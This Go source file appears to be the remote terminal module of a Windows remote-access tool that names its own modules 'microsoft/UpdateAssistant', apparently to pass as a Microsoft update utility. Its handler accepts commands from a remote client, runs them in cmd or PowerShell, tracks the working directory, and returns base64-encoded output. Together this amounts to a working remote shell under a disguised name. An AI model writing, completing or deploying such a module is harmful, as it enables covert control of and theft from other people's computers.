//go:build windows

package terminal

import (
	"encoding/base64"
	"encoding/json"
	"strings"
	"sync"

	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

func Handle(client *transport.Client, payload json.RawMessage) {
	var m struct {
		Cmd   string `json:"cmd"`
		Shell string `json:"shell"`
	}
	if json.Unmarshal(payload, &m) != nil || m.Cmd == "" {
		return
	}
	go run(client, m.Cmd, m.Shell)
}

var (
	cwdMu sync.Mutex
	cwds  = map[string]string{"cmd": "", "ps": ""}
)

const cmdTimeout = 30

func run(client *transport.Client, cmd string, shell string) {
	if shell != "ps" {
		shell = "cmd"
	}

	cwdMu.Lock()
	curCwd := cwds[shell]
	cwdMu.Unlock()

	trimmed := strings.TrimSpace(cmd)

	var out []byte
	var exit int32
	var err error

	if shell == "ps" {
		if strings.HasPrefix(strings.ToLower(trimmed), "set-location ") || strings.HasPrefix(strings.ToLower(trimmed), "cd ") || strings.ToLower(trimmed) == "cd" {
			out, _, err = sysutil.RunPS(trimmed+"; (Get-Location).Path", curCwd)
			if err == nil && len(out) > 0 {
				newCwd := strings.TrimSpace(string(out))
				cwdMu.Lock()
				cwds[shell] = newCwd
				cwdMu.Unlock()
				client.Send("terminal_ps_output", map[string]interface{}{
					"output": base64.StdEncoding.EncodeToString([]byte(newCwd)),
					"exit":   0,
					"cwd":    newCwd,
				})
				return
			}
		}
		out, exit, err = sysutil.RunPS(cmd, curCwd)
	} else {
		if strings.HasPrefix(strings.ToLower(trimmed), "cd ") || strings.ToLower(trimmed) == "cd" {
			out, _, err = sysutil.RunCommand(trimmed+" && cd", curCwd)
			if err == nil && len(out) > 0 {
				newCwd := strings.TrimSpace(string(out))
				cwdMu.Lock()
				cwds[shell] = newCwd
				cwdMu.Unlock()
				client.Send("terminal_output", map[string]interface{}{
					"output": base64.StdEncoding.EncodeToString([]byte(newCwd)),
					"exit":   0,
					"cwd":    newCwd,
					"shell":  shell,
				})
				return
			}
		}
		out, exit, err = sysutil.RunCommand(cmd, curCwd)
	}

	event := "terminal_output"
	if shell == "ps" {
		event = "terminal_ps_output"
	}
	if err != nil {
		msg := err.Error()
		client.Send(event, map[string]interface{}{"output": base64.StdEncoding.EncodeToString([]byte(msg)), "exit": 1, "cwd": curCwd})
		return
	}
	if len(out) == 0 {
		out = []byte("(no output)")
	}
	client.Send(event, map[string]interface{}{
		"output": base64.StdEncoding.EncodeToString(out),
		"exit":   int(exit),
		"cwd":    curCwd,
	})
}
